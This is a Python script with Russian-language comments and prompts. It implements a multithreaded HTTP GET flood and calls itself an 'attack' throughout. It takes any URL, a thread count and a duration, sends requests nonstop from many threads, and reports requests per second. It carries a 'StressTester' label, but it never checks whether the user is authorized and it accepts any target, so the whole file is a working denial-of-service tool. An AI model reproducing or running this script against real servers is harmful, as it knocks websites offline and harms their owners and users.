import requests
import threading
import time
import sys
from urllib.parse import urlparse
from colorama import init, Fore, Style

init(autoreset=True)

# --- Эффект печати ---
def print_line(text, color=Fore.WHITE, delay_char=0.01):
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay_char)
    print(Style.RESET_ALL)

# --- Валидация URL ---
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False

# --- Атакующий поток ---
def attack(target, duration, results):
    end_time = time.time() + duration
    sent = 0
    errors = 0
    while time.time() < end_time:
        try:
            # Отправляем GET-запрос
            requests.get(
                target,
                headers={'User-Agent': 'StressTester/1.0'},
                timeout=5
            )
            sent += 1
        except Exception:
            errors += 1
        time.sleep(0.007)  # Минимальная задержка, чтобы не упасть самому
    results.append((sent, errors))

# --- Основная функция ---
def main():
    target = input("Введите URL сервера: ").strip()
    if not is_valid_url(target):
        print_line("[!] Неверный URL. Обязательно укажите http:// или https://", Fore.RED)
        return

    try:
        threads_count = int(input("Количество потоков (рекомендуется 50-100): ") or "20")
        duration = int(input("Длительность атаки в секундах (рекомендуется 60-100): ") or "15")
    except ValueError:
        print_line("[!] Введите числа.", Fore.RED)
        return

    # Проверка доступности
    print_line(f"[ ] Проверка доступности {target}...", Fore.CYAN)
    try:
        requests.get(target, timeout=5)
        print_line("[OK] Сервер доступен. Запуск атаки...", Fore.GREEN)
    except Exception:
        print_line("[!] Сервер недоступен. Отмена.", Fore.RED)
        return

    print()
    print_line("🔥 ЗАПУСК атаки", Fore.LIGHTRED_EX)
    print_line(f"Цель: {target}", Fore.YELLOW)
    print_line(f"Потоков: {threads_count}", Fore.CYAN)
    print_line(f"Время: {duration} сек", Fore.MAGENTA)
    print_line("-" * 50, Fore.LIGHTBLACK_EX)

    # Запуск потоков
    results = []
    threads = []
    start_time = time.time()

    for _ in range(threads_count):
        t = threading.Thread(target=attack, args=(target, duration, results))
        t.start()
        threads.append(t)

    # Ожидание завершения
    for t in threads:
        t.join()

    total_sent = sum(r[0] for r in results)
    total_errors = sum(r[1] for r in results)
    elapsed = time.time() - start_time
    rps = total_sent / elapsed if elapsed > 0 else 0

    # Вывод результатов
    print()
    print_line("РЕЗУЛЬТАТЫ АТАКИ", Fore.LIGHTGREEN_EX)
    print_line("=" * 50, Fore.LIGHTBLUE_EX)
    print_line(f"Отправлено запросов: {total_sent}", Fore.WHITE)
    print_line(f"Ошибок: {total_errors}", Fore.LIGHTRED_EX)
    print_line(f"Время: {elapsed:.2f} сек", Fore.CYAN)
    print_line(f"Скорость: {rps:.1f} RPS (запросов/сек)", Fore.YELLOW)
    print_line("=" * 50, Fore.LIGHTBLUE_EX)
    print_line("✅ Атака завершена", Fore.LIGHTGREEN_EX)

# --- Запуск ---
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_line("\n[!] Атака прервана.", Fore.RED)
    except Exception as e:
        print_line(f"[ERROR] {str(e)}", Fore.RED)